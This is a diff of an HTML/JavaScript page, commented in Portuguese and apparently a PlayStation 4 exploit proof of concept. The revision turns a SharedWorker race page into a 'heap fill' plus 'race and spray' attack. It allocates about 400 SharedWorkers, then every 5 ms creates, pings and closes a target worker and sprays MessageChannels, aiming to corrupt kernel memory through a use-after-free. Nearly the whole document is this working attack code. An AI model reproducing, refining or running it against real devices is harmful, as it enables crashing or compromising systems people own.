@@ -2,134 +2,116 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 SharedWorker Race Exploit (Corrected)</title>
+    <title>PS4 SharedWorker SPRAY PoC</title>
+    
 </head>
 <body>
 
-    <h1>SharedWorker IPC Race (Target 400-401)</h1>
+    <h1>SharedWorker UAF/Spray Test</h1>
     
-    <div class="control-panel">
-        <p>
-            <label>1. Encher até (Base Segura): <input type="number" id="baseFill" value="400"></label>
-            <button id="btnFill" onclick="runFill()">ENCHER MEMÓRIA</button>
-        </p>
-        <p>
-            <label>2. Race Loop (Delay ms): <input type="number" id="raceDelay" value="0"></label>
-            <button id="btnRace" onclick="runRace()" disabled>INICIAR RACE (401º)</button>
-        </p>
-        <p>Status: <span id="status" class="highlight">Aguardando...</span></p>
+    <div class="panel">
+        <h3>1. Preparação (Encher Heap)</h3>
+        Quantidade Base: <input type="number" id="fillAmount" value="400" style="width: 60px;">
+        <button id="btnFill" onclick="startFill()">ENCHER MEMÓRIA</button>
+    </div>
+
+    <div class="panel">
+        <h3>2. Ataque (Race + Spray)</h3>
+        <p>Tenta substituir o Worker morto por MessageChannels.</p>
+        <button id="btnSpray" onclick="startSpray()" disabled>INICIAR SPRAY LOOP</button>
+        <button onclick="stopSpray()">PARAR</button>
     </div>
 
     <div id="log">Logs do sistema...</div>
 
     <script>
-        let workers = [];
+        const logEl = document.getElementById('log');
+        let workers = []; // Mantém os workers vivos
+        let sprayKeepers = []; // Mantém os objetos de spray vivos
         let raceInterval = null;
-        let isRacing = false;
-
-        const logElement = document.getElementById('log');
-        const statusElement = document.getElementById('status');
-        const btnRace = document.getElementById('btnRace');
-        const btnFill = document.getElementById('btnFill');
-
-        function log(msg, type='') {
-            const time = new Date().toLocaleTimeString();
-            let color = type === 'error' ? 'red' : (type === 'warn' ? 'yellow' : '#0f0');
-            logElement.innerHTML = `<span style="color:${color}">[${time}] ${msg}</span><br>` + logElement.innerHTML;
+        
+        function log(msg) {
+            const time = new Date().toLocaleTimeString().split(' ')[0];
+            logEl.innerHTML = `[${time}] ${msg}\n` + logEl.innerHTML;
         }
 
-        // 1. Fase de Enchimento (Fill)
-        async function runFill() {
-            const target = parseInt(document.getElementById('baseFill').value);
-            btnFill.disabled = true;
-            statusElement.innerText = `Enchendo até ${target}...`;
+        // --- FASE 1: ENCHIMENTO ---
+        async function startFill() {
+            const limit = parseInt(document.getElementById('fillAmount').value);
+            document.getElementById('btnFill').disabled = true;
+            log(`Iniciando enchimento até ${limit}...`);
 
-            // Enche em blocos para não travar a UI
-            let current = 0;
-            
-            function addBatch() {
-                const batchSize = 10;
-                for (let i = 0; i < batchSize; i++) {
-                    if (current >= target) break;
+            let count = 0;
+            const batch = setInterval(() => {
+                for(let i=0; i<5; i++) {
+                    if(count >= limit) {
+                        clearInterval(batch);
+                        log("Enchimento concluído. Memória pronta.");
+                        document.getElementById('btnSpray').disabled = false;
+                        return;
+                    }
                     try {
-                        // Nomes únicos para garantir alocação de nova estrutura IPC
-                        const id = "filler_" + current + "_" + Math.random();
-                        // Script vazio para minimizar uso de RAM do WebKit, focando no handle do Kernel
+                        // Worker vazio apenas para ocupar slot no Kernel
+                        const id = `filler_${count}`;
                         const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                        sw.port.start();
                         workers.push(sw);
-                        current++;
-                    } catch (e) {
-                        log(`Erro ao encher no índice ${current}: ${e.message}`, 'error');
-                        statusElement.innerText = "Falha no enchimento!";
-                        return; // Para se der erro (provavelmente atingiu o limite real)
+                        count++;
+                    } catch(e) {
+                        log(`Erro fatal no enchimento (${count}): ${e.message}`);
+                        clearInterval(batch);
                     }
                 }
-
-                if (current < target) {
-                    if (current % 50 === 0) log(`Alocados: ${current}/${target}...`);
-                    setTimeout(addBatch, 10); // Pausa para a UI respirar
-                } else {
-                    log(`Sucesso! ${current} workers base alocados. Estamos na borda.`, 'warn');
-                    statusElement.innerText = "Memória Cheia. Pronto para Race.";
-                    btnRace.disabled = false;
-                }
-            }
-
-            addBatch();
+                if(count % 50 === 0) log(`Alocados: ${count}/${limit}`);
+            }, 10);
         }
 
-        // 2. Fase de Race Condition (Spray & Pray)
-        function runRace() {
-            if (isRacing) {
-                // Parar
-                clearInterval(raceInterval);
-                isRacing = false;
-                btnRace.innerText = "INICIAR RACE (401º)";
-                statusElement.innerText = "Race parada.";
-                log("Loop de Race interrompido.");
-                return;
-            }
-
-            const delay = parseInt(document.getElementById('raceDelay').value);
-            isRacing = true;
-            btnRace.innerText = "PARAR RACE";
-            statusElement.innerText = "EXECUTANDO RACE...";
-            log("Iniciando martelada no 401º slot...", 'warn');
-
-            let cycles = 0;
-
+        // --- FASE 2: O ATAQUE (RACE + SPRAY) ---
+        function startSpray() {
+            if(raceInterval) return;
+            log("!!! INICIANDO LOOP DE ATAQUE !!!");
+            
+            let cycle = 0;
+            
             raceInterval = setInterval(() => {
-                cycles++;
-                const id = "race_" + Date.now() + "_" + cycles;
+                cycle++;
+                const id = `target_${Date.now()}_${cycle}`;
                 
                 try {
-                    // Tenta alocar o worker que seria o 401 (Instável)
+                    // 1. ALOCA O ALVO (O 401º Worker)
                     const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                    const port = sw.port;
                     
-                    // --- AQUI É O PULO DO GATO ---
-                    // Tentamos usar o objeto IMEDIATAMENTE.
-                    // Se o Kernel estiver confuso (instabilidade 401-403),
-                    // ele pode nos dar um handle inválido ou duplicado.
-                    sw.port.postMessage("ping"); 
+                    // 2. USA O RECURSO (Gatilho para o Kernel olhar para este endereço)
+                    port.postMessage("ping"); 
 
-                    // Destruição imediata para tentar liberar o slot para o próximo ciclo
-                    // Isso força o Kernel a fazer free() e alloc() muito rápido no mesmo endereço
-                    sw.port.close();
+                    // 3. LIBERAÇÃO (O Buraco na Memória)
+                    // Fechamos a porta explicitamente
+                    port.close();
                     
-                    // Sobrescreve a variável para o GC marcar
-                    // (Não podemos deletar explicitamente em JS, mas perdemos a referência)
-                    
-                } catch (e) {
-                    // Se falhar a alocação (limite duro atingido), apenas logamos e continuamos tentando
-                    // O Panic geralmente acontece aqui quando o Kernel falha em lidar com o erro
-                    // log(`Falha de alocação no ciclo ${cycles} (Esperado): ${e.message}`, 'warn');
+                    // 4. SPRAY IMEDIATO (Tentar ocupar o buraco)
+                    // Criamos vários canais IPC leves. Se o Kernel reutilizar o ID do worker
+                    // para um desses canais, bingo.
+                    for(let i=0; i < 20; i++) {
+                        const mc = new MessageChannel();
+                        // Mantemos referência para o GC não limpar imediatamente
+                        // Mas usamos um array circular pequeno para não estourar a RAM do navegador
+                        sprayKeepers[i % 500] = mc; 
+                    }
+
+                } catch(e) {
+                    // Ignora erros de alocação (esperados no limite)
                 }
 
-                if (cycles % 200 === 0) {
-                    log(`Race ativa: ${cycles} ciclos no slot 401.`);
-                }
+                if(cycle % 100 === 0) log(`Ciclo ${cycle}: Tentando corrupção...`);
 
-            }, delay);
+            }, 5); // Tenta a cada 5ms (Agressivo)
+        }
+
+        function stopSpray() {
+            clearInterval(raceInterval);
+            raceInterval = null;
+            log("Ataque parado.");
         }
     </script>
 </body>
